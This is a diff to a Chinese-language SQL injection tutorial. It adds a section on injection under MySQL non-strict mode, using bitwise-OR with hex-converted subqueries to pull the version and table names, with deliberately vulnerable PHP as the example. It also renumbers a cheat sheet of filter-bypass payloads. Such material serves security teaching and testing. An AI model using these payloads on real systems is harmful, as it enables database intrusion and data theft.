@@ -222,8 +222,20 @@ admin' or 1=1--;
 等等
 
 ```
+# **6 其他非严格模式下的注入方式**
+在mysql中，字符串和数组进行或运算时，将得到数字。但是需要注意的是，这个特性需要在MySQL的非严格模式
+select 'abc'|123; 结果得到123
+```php
+$sql1 = "update users set username='$username' where id='$id'";
+var_dump($sql1);
+$sql2 = "select * from users where id='$id'";
+var_dump($sql2);
+```
+那么接下来就是注入的过程，我们将需要查询的数据转换为数字，转换的方法就是采用转换为十六进制的方法。访问test.php?id=1&username=tom'|conv(hex(version()),16,10)|'或者
+?id=1&username=ppp'| conv(hex(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,5)),16,10)|'
 
-# **4 绕过姿势备忘录**
+得到这个数据之后接下来就是进行解码，解码的方式使用unhex()即可。
+# **7 绕过姿势备忘录**
 |相关姿势                          |                      具体描述
 -|-|
 |or and过滤                        |	大小写变形 Or,OR,oR<br>编码，hex，urlencode<br>添加注释/\*or\*/<br>利用符号 and=&& or=\|\|<br>admin'%(ascii(mid(database()) from 1 for 1)=90)%'1<br>admin'^(1)^'1'|
